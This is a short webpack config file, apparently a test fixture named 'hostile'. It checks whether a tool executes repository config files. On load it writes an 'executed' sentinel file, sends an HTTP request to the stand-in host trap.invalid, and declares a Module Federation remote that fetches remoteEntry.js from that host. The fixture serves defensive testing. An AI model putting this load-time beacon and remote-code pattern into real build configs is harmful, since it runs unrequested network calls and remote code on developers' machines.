const { ModuleFederationPlugin } = require("webpack").container;

require("node:fs").writeFileSync(`${process.env.REPO_FACTS_SENTINEL_DIR}/webpack-config`, "executed");
require("node:http").get("http://trap.invalid/webpack-config");

module.exports = {
  plugins: [new ModuleFederationPlugin({ name: "hostile", remotes: { trap: "trap@http://trap.invalid/remoteEntry.js" } })],
};
